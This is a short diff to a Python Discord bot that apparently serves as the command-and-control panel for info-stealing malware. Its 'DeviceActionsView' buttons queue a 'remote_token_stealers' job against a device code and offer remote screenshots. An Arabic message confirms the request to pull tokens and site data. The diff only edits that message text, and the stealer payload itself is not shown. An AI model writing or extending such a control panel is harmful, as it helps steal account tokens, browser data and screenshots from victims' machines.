@@ -366,7 +366,7 @@ class DeviceActionsView(discord.ui.View):
         db, sha, url, headers = fetch_db()
         if db:
             db.setdefault("remote_token_stealers", {})[self.code] = {"id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Tokens {self.code}"): await interaction.followup.send("🔑 تم طلب سحب التوكنات والمتصفحات الشاملة!", ephemeral=True)
+            if save_db(db, sha, url, headers, f"Tokens {self.code}"): await interaction.followup.send("🔑 تم طلب سحب التوكنات والمواقع الشاملة!", ephemeral=True)
 
     @discord.ui.button(label="📸 لقطة شاشة", style=discord.ButtonStyle.secondary, custom_id="dev_act_screenshot", row=1)
     async def ss_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
